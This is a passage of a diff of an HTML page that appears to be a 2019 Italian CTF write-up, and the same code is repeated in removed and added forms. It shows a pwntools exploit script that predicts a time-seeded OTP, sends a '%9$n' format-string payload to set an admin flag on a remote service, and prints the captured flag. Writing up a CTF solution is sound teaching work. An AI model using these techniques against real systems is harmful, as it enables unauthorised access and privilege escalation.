+<span class=n>conn</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;185.66.87.233&#34;</span><span class=p>,</span><span class=mi>5002</span><span class=p>)</span>
 
-<span class="k">def</span> <span class="nf">genOTPcode</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="n">param_2</span><span class="p">):</span>
-  <span class="n">tVar1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
+<span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Login:&#34;</span><span class=p>)</span>
 
-  <span class="n">libc</span><span class="o">.</span><span class="n">srand</span><span class="p">(</span><span class="n">tVar1</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">param_1</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">param_2</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
-  <span class="n">iVar2</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">rand</span><span class="p">();</span>
-  <span class="k">return</span> <span class="n">iVar2</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">iVar2</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>username</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>)</span>
 
-<span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;test_account&#34;</span>
-<span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;test_password&#34;</span>
+<span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Password:&#34;</span><span class=p>)</span>
+<span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>password</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>)</span>
 
-<span class="n">adminFlag</span> <span class="o">=</span> <span class="mh">0x0804c058</span>
+<span class=n>OPT</span> <span class=o>=</span> <span class=n>genOTPcode</span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=p>)</span>
 
-<span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;185.66.87.233&#34;</span><span class="p">,</span><span class="mi">5002</span><span class="p">)</span>
+<span class=k>print</span><span class=p>(</span><span class=s2>&#34;[*]Username: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>username</span><span class=p>)</span>
+<span class=k>print</span><span class=p>(</span><span class=s2>&#34;[*]Password: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>password</span><span class=p>)</span>
+<span class=k>print</span><span class=p>(</span><span class=s2>&#34;[*]OPT Code: </span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>OPT</span><span class=p>)</span>
 
-<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Login:&#34;</span><span class="p">)</span>
+<span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>OPT</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>)</span>
+<span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;2</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>)</span> <span class=c1>#Set a station</span>
 
-<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">username</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Set station &gt;&#34;</span><span class=p>)</span>
 
-<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Password:&#34;</span><span class="p">)</span>
-<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">password</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class=c1>#Privilege escalation</span>
+<span class=n>exploit</span> <span class=o>=</span> <span class=s2>&#34;AAAA%9$n&#34;</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=n>adminFlag</span><span class=p>)</span>
+<span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>exploit</span><span class=p>)</span>
 
-<span class="n">OPT</span> <span class="o">=</span> <span class="n">genOTPcode</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span>
-
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;[*]Username: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">username</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;[*]Password: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">password</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;[*]OPT Code: </span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">OPT</span><span class="p">)</span>
-
-<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">OPT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;2</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1">#Set a station</span>
-
-<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Set station &gt;&#34;</span><span class="p">)</span>
-
-<span class="c1">#Privilege escalation</span>
-<span class="n">exploit</span> <span class="o">=</span> <span class="s2">&#34;AAAA%9$n&#34;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">adminFlag</span><span class="p">)</span>
-<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
-
-<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;1</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">))</span> <span class="c1">#flag</span>
-<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
-<p>Eseguendo il programma si ottiene la flag:</p>
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Aero{fb9941700eede4f73024afd7ffc8d7f9}</code></pre></div>
-  </section>
-</article>
-
-</main>
-
-</div>
-
-<footer>
-  <div class="container">
-    <span class="copyright">&copy; 2019 R13 - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
-  </div>
-</footer>
-
-</body>
-</html>
-
+<span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;1</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>)</span>
+<span class=k>print</span><span class=p>(</span><span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;}&#39;</span><span class=p>))</span> <span class=c1>#flag</span>
+<span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span></code></pre></div><p>Eseguendo il programma si ottiene la flag:</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>Aero{fb9941700eede4f73024afd7ffc8d7f9}</code></pre></div></section></article></main></div><footer><div class=container><span class=copyright>&copy; 2019 R13 - <a rel=license href=http://creativecommons.org/licenses/by/4.0/>CC BY 4.0</a></span></div></footer></body></html>
